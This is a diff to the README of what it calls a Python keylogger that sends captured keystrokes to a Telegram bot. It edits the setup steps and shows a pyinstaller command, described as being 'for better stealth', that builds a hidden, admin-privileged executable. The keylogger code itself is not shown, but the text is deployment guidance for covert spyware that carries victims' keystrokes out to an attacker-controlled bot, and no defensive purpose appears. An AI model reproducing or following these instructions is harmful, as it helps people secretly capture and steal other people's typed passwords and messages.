@@ -27,7 +27,7 @@ A Python keylogger that sends captured keystrokes to a Telegram bot.
 2. Configure the bot:
 - Create a Telegram bot by messaging @BotFather on Telegram
 - Get your bot token
-- Get your chat ID (send a message to your bot, then check https://api.telegram.org/bot<TOKEN>/getUpdates)
+- Get your chat ID (send a message to your bot, then check @userinfobot)
 
 3. Update the configuration in `Keylogger.py`:
 - Replace `bot_token` with your actual bot token
@@ -91,6 +91,7 @@ To convert this Python script into a standalone executable (.exe) file:
 ### Advanced Options
 
 For better stealth and functionality, use these additional options:
+ 
 pyinstaller --onefile --noconsole --icon=icon.ico --uac-admin Keylogger.py
 
 - `--icon=icon.ico`: Adds a custom icon (optional)
